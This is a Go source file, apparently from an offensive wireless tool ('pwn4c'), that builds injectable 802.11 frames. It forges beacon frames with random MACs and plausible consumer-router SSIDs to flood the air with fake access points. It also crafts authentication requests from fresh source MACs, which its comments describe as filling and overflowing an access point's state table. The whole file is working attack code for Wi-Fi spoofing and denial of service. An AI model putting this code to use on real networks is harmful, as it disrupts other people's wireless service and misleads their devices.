package drone

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
)

// broadcastMAC is Addr1 for every beacon: an AP announces itself to everyone.
var broadcastMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

// beaconBody builds the fixed parameters and the elements every beacon-like
// frame carries: timestamp, beacon interval, capability, SSID, Supported Rates
// and the DS Parameter Set. A caller that needs more (a CSA element, an RSN
// element) appends it.
//
// Capability advertises ESS | Privacy | Short Preamble | Short Slot Time. An AP
// that runs WPA2-PSK sets the privacy bit; a client that is already associated
// knows the real value and ignores this copy.
func beaconBody(ssid []byte, channel int) []byte {
	body := make([]byte, 0, 12+2+len(ssid)+6+3)
	body = append(body, 0, 0, 0, 0, 0, 0, 0, 0) // timestamp
	body = append(body, 0x64, 0x00)             // beacon interval: 100 TU
	body = append(body, 0x31, 0x04)             // capability
	body = append(body, ieSSID, byte(len(ssid)))
	body = append(body, ssid...)
	body = append(body, ieSupportedRate, 4, 0x82, 0x84, 0x8b, 0x96)
	body = append(body, ieDSParams, 1, byte(normalizeChannel(channel)))
	return body
}

// BeaconParams describes one beacon frame. The zero value is not usable: BSSID
// must be a MAC and SSID at most 32 bytes.
type BeaconParams struct {
	BSSID string
	SSID  string
	// Hidden blanks the SSID element while keeping the frame a normal beacon,
	// which is what a hidden network looks like on the air.
	Hidden bool
	// Seq is the 802.11 sequence number. Repeating one makes clients treat the
	// copies as duplicates, so callers should increment it.
	Seq     uint16
	Options FrameOptions
}

// BuildBeaconFrame renders one beacon wrapped in a RadioTap header, ready for
// SEND_INJECTION. It is the building block of `pwn4c beacon-flood` and of the
// spoofed beacons other features send.
func BuildBeaconFrame(p BeaconParams) (string, error) {
	bssid, err := net.ParseMAC(p.BSSID)
	if err != nil {
		return "", fmt.Errorf("invalid BSSID MAC: %w", err)
	}
	if len(bssid) != 6 {
		return "", fmt.Errorf("invalid BSSID MAC: %q is not 6 octets", p.BSSID)
	}

	ssid := []byte(p.SSID)
	if len(ssid) > 32 {
		return "", fmt.Errorf("SSID is %d bytes; 802.11 allows at most 32", len(ssid))
	}
	if p.Hidden {
		ssid = nil
	}

	body := beaconBody(ssid, p.Options.Channel)

	frame := make([]byte, 0, 16+24+len(body))
	frame = append(frame, radiotapHeader(p.Options.Channel, p.Options.RateMbps)...)
	frame = append(frame, mgmtHeader(0x80, broadcastMAC, bssid, bssid, p.Seq)...)
	frame = append(frame, body...)

	return hex.EncodeToString(frame), nil
}

// AuthParams describes one authentication frame.
//
// A request is algorithm 0 (Open System), transaction sequence 1, status 0. An
// AP answers with transaction sequence 2; flooding requests from fresh source
// MACs is what fills (and overflows) its authentication state table.
type AuthParams struct {
	BSSID string
	// Client is Addr2 (the source MAC the AP will try to remember).
	Client string
	// Algorithm is 0 for Open System, 1 for Shared Key (the deprecated WEP
	// exchange). Defaults to 0.
	Algorithm uint16
	// AuthSeq is the transaction sequence; 1 is a request. Defaults to 1.
	AuthSeq uint16
	Seq     uint16
	Options FrameOptions
}

// BuildAuthFrame renders one authentication frame wrapped in a RadioTap header.
func BuildAuthFrame(p AuthParams) (string, error) {
	bssid, err := net.ParseMAC(p.BSSID)
	if err != nil {
		return "", fmt.Errorf("invalid BSSID MAC: %w", err)
	}
	if len(bssid) != 6 {
		return "", fmt.Errorf("invalid BSSID MAC: %q is not 6 octets", p.BSSID)
	}

	client, err := net.ParseMAC(p.Client)
	if err != nil {
		return "", fmt.Errorf("invalid client MAC: %w", err)
	}
	if len(client) != 6 {
		return "", fmt.Errorf("invalid client MAC: %q is not 6 octets", p.Client)
	}
	if client[0]&0x01 != 0 {
		return "", fmt.Errorf("client MAC %q is a group address", p.Client)
	}

	authSeq := p.AuthSeq
	if authSeq == 0 {
		authSeq = 1
	}

	body := []byte{
		byte(p.Algorithm), byte(p.Algorithm >> 8),
		byte(authSeq), byte(authSeq >> 8),
		0x00, 0x00, // status: successful / reserved in a request
	}

	frame := make([]byte, 0, 16+24+len(body))
	frame = append(frame, radiotapHeader(p.Options.Channel, p.Options.RateMbps)...)
	frame = append(frame, mgmtHeader(0xb0, bssid, client, bssid, p.Seq)...)
	frame = append(frame, body...)

	return hex.EncodeToString(frame), nil
}

// RandomMAC returns a random locally administered unicast MAC. The 0x02 bit
// marks it as locally administered, so it cannot collide with a real vendor
// address, and the 0x01 bit stays clear so it is never a group address.
func RandomMAC() string {
	var b [6]byte
	_, _ = rand.Read(b[:])
	b[0] = (b[0] & 0xfc) | 0x02
	return net.HardwareAddr(b[:]).String()
}

// commonSSIDPrefixes are the names consumer routers ship with. A random
// four-character suffix is appended so every flooded beacon looks like a
// different, plausible access point.
var commonSSIDPrefixes = []string{
	"TP-LINK_", "TP-Link_", "NETGEAR", "NETGEAR-5G", "linksys", "Cisco_",
	"Xiaomi_", "HUAWEI-", "HONOR_", "Redmi_", "dlink-", "D-Link_",
	"Tenda_", "Tenda_5G", "FAST_", "MERCURY_", "H3C_", "TOTOLINK_",
	"ChinaNet-", "CMCC-", "CU_", "asus", "ASUS_", "belkin.", "TRENDnet",
	"Zyxel", "ZyXEL_", "ARRIS-", "Hitron-", "Technicolor", "FRITZ!Box ",
	"AndroidAP", "iPhone", "iPhone-", "Galaxy", "DESKTOP-", "DIRECT-",
	"HP-Print-", "Canon_", "EPSON", "printer-", "Airport", "Guest",
	"FreeWiFi", "Free WiFi", "Starbucks WiFi", "WLAN-", "Home-", "MyWiFi",
}

// RandomSSID returns a plausible SSID with a random four-hex-character suffix,
// e.g. "TP-LINK_4F2A". The result always fits the 32-byte 802.11 limit.
func RandomSSID() string {
	var b [2]byte
	_, _ = rand.Read(b[:])

	prefix := commonSSIDPrefixes[int(b[0])%len(commonSSIDPrefixes)]
	if len(prefix) > 27 {
		prefix = prefix[:27]
	}
	return fmt.Sprintf("%s%02X%02X", prefix, b[0], b[1])
}
